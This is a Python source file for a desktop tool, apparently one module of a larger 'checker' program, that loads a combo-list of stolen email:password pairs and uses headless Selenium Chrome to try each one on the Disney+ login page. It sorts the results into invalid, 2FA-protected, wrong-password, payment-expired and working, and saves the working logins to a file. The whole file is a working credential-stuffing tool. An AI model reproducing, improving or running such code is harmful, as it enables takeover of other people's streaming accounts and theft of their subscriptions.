import time
import threading
import os
from socket import gaierror
from urllib3.exceptions import NewConnectionError, MaxRetryError
from requests.exceptions import ConnectionError
from split_combos import split_combos
from tkinter import *
from tkinter.ttk import *
from selenium.common.exceptions import TimeoutException, WebDriverException, NoSuchElementException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

class disney_checker():

	def __init__(self, root, background_colour):
		
		self.information_bar = Canvas(root, bg=background_colour)
		self.information_bar.place(x=58,y=238,width=681,height=38)
		self.infobox = Text(root, bg= background_colour,font=('Arial',11))
		self.file_directory = str(Path(__file__).parents[1])+'/disney'
		self.page = 'https://www.disneyplus.com/login'
		self.users = []
		self.passwords = []
		self.Two_Factor = False
		self.browser_options = Options()
		self.browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')		
		self.browser_options.headless = True
		self.start_checker = Button(root, text = 'Start Checker',command = self.account_checker_thread, style='GUI_Buttons.TButton')
		self.stop_checker = False
		self.run_only_on_first_checker_instance = True
		self.index = 0
		self.error_returned = False

	def split_combo_file(self,root, background_colour,buttonx,buttony):
	
		self.split_combos = split_combos(root,'disney',background_colour,buttonx,buttony)
		
	def draw_checker_button(self,xpos,ypos):
			
		self.start_checker.place(x=xpos,y=ypos)
			
	def draw_the_infobox(self):

		self.infobox.place(x=58,y=288,width=681,height=250)
		
	def split_username_and_password(self):
		try:		
			os.makedirs('accounts',exist_ok=True)
			with open(self.file_directory, 'r') as disney:
				for line in disney.readlines():
						self.users.append(line.split(':')[0].strip())
						self.passwords.append(line.split(':')[1].strip())
											
		except FileNotFoundError:
			self.information_bar.create_text(90,18,text = 'Error: File Not Found.',font=('Arial',12))
			self.infobox.insert(END,"There is no combo-list present in directory.\n\nMake sure to include a combo-list for the appropriate service in:\n\n ' {} '".format(str(Path(__file__).parents[1])))
			self.infobox.config(state=DISABLED)
			self.error_returned = True
			
		except IndexError:
			self.information_bar.create_text(90,18,text = 'Parsing Error.',font=('Arial',12))
			self.infobox.insert(END,"There is something wrong with the combolist.\n\nIt might have been split twice, have spaces included, or invalid characters")
			self.infobox.config(state=DISABLED)
			self.error_returned = True
						
	def destroy_all_elements(self):
		
		self.split_combos.destroy_split_button()
		self.start_checker.destroy()
		self.infobox.destroy()
		self.information_bar.destroy()
		self.split_combos.destroy_info_label()
	
	def infobox_message(self,text):
		
		self.infobox.config(state=NORMAL)
		self.infobox.insert(END,text)
		self.infobox.config(state=DISABLED)
		
	def check_the_accounts(self):
	
		travelling = False
		if self.run_only_on_first_checker_instance == True:
			self.split_username_and_password()
		self.draw_the_infobox()
		self.split_combos.destroy_info_label()
		error_on_first_page = False
		
		while self.index != len(self.users):
		
			if ' | ' in str(self.passwords[self.index]):
				self.information_bar.create_text(150,18,text = 'Error: List not split (Invalid Characters)',font=('Arial',12))
				self.infobox_message("The combo-list has not been split into a readable format.\n\nIt contains characters like ' | ' and surplus information like 'STATUS' or 'PLAN'.\n\nPlease split the list and try again.")
				break
				
			if self.error_returned == True:
				break
				
			if self.stop_checker == True:
				self.information_bar.delete('all')
				self.information_bar.create_text(82,18,text = 'Paused..',font=('Arial',12))
				self.start_checker.configure(text = 'Resume', command = self.account_checker_thread)
				self.stop_checker = False
				self.run_only_on_first_checker_instance = False
				break
			self.start_checker.configure(text = 'Pause', command = self.pause_resume_the_checker)
			
			with open('accounts/disney_working_accounts','a') as account_results:
				try:
					self.infobox_message('Trying Combo {} out of {}'.format(self.index+1, len(self.users)))
					self.information_bar.delete('all')
					self.information_bar.create_text(75,18,text = 'Opening Browser...',font=('Arial',12))
					self.information_bar.update_idletasks()
					browser = webdriver.Chrome(options = self.browser_options)
					browser.set_page_load_timeout(15)
					browser.set_window_size(500,700)
					browser.get(self.page)
					while True:
						try:
							email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
							break
						except NoSuchElementException:
							continue
					time.sleep(3)
					continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
					email_input_box.send_keys(self.users[self.index])
					self.information_bar.delete('all')
					self.information_bar.create_text(75,18,text ='Entering Email...',font=('Arial',12))
					self.information_bar.update_idletasks()

					continue_button.click()
					time.sleep(3)
					
					if browser.find_elements_by_xpath('/html/body/div[3]/div/div/h4'):
						email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
						if "We couldn't find an account for that email" in str(email_error):
							self.infobox_message(' | {}:{} ---> Invalid Email\n'.format(self.users[self.index],self.passwords[self.index]))
							error_on_first_page = True
							
					if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
						two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
						if 'Check your email inbox' in str(two_factor_authentication):
							self.infobox_message(" | {}:{} ---> Protected by 2FA\n".format(self.users[self.index],self.passwords[self.index]))
							error_on_first_page = True
							
					if error_on_first_page != True:
						password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
						login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
						password_input_box.send_keys(self.passwords[self.index])
						self.information_bar.delete('all')
						self.information_bar.create_text(75,18,text ='Entering Password...',font=('Arial',12))
						self.information_bar.update_idletasks()
						login_button.click()
						self.information_bar.delete('all')
						self.information_bar.create_text(65,18,text ='Logging in...',font=('Arial',12))
						self.information_bar.update_idletasks()
						time.sleep(5)
						if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
							gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
							gdpr_reject_all.click()
						if browser.find_elements_by_xpath('//*[@id="app_index"]/div[3]/div/div'):
								travelling = True
								self.infobox_message(' | {}:{} ---> Success! (Travelling)\n'.format(self.users[self.index],self.passwords[self.index]))
						if browser.find_elements_by_xpath('//*[@id="password__error"]'):
							password_or_429_error = browser.find_element_by_xpath('//*[@id="password__error"]').text
							if 'Incorrect Password' in str(password_or_429_error):
								self.infobox_message(" | {}:{} ---> Password is incorrect\n".format(self.users[self.index],self.passwords[self.index]))					
							if 'Due to' in str(password_or_429_error):
								self.infobox.insert(END," | Login Blocked.\n")
							if "We couldn't log you in. Please check your email and password and try again" in str(password_or_429_error):
								self.infobox_message(" | {}:{} ---> Password is incorrect\n".format(self.users[self.index],self.passwords[self.index]))
						if browser.find_elements_by_xpath('//*[@id="section_index"]/div/div[2]/div/div[2]/h2'):
							subscription_on_hold = browser.find_element_by_xpath('//*[@id="section_index"]/div/div[2]/div/div[2]/h2').text
							if "Resume subscription" in str(subscription_on_hold):
								self.infobox_message(" | {}:{} ---> Payment Expired\n".format(self.users[self.index],self.passwords[self.index]))
								
						
						if str(browser.current_url)[-4:] == 'home' and travelling == False:
							self.infobox_message(" | {}:{} ---> Success!\n".format(self.users[self.index],self.passwords[self.index]))
						if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
							valid = browser.find_element_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2').text
							if "Who's watching?" in str(valid) or "Who's Watching?" in str(valid):
								self.infobox_message(" | {}:{} ---> Success!\n".format(self.users[self.index],self.passwords[self.index]))					
								account_results.write('{}:{} ---> Good Account\n'.format(self.users[self.index],self.passwords[self.index]))
					self.index += 1
					error_on_first_page = False
					travelling = False
					browser.close()
					
				except (gaierror, NewConnectionError, ConnectionError, WebDriverException):
					self.information_bar.delete('all')
					self.information_bar.create_text(75,18,text ='Error: No Internet',font=('Arial',12))
					self.infobox_message("\n\nCan't connect, please check your connection and try again.")
					break
				
				except TimeoutException:
					self.infobox_message(' | {}:{} ---> Timed Out\n')
					break
										
				except Exception as e:
					self.infobox_message('\n{}'.format(e))
					break
					
	def pause_resume_the_checker(self):
		self.information_bar.create_text(450,18,text ='(Pause Queued, Please Wait...)',font=('Arial',12))
		self.stop_checker = True
	
	def account_checker_thread(self):
		threading.Thread(target=self.check_the_accounts,args=()).start()

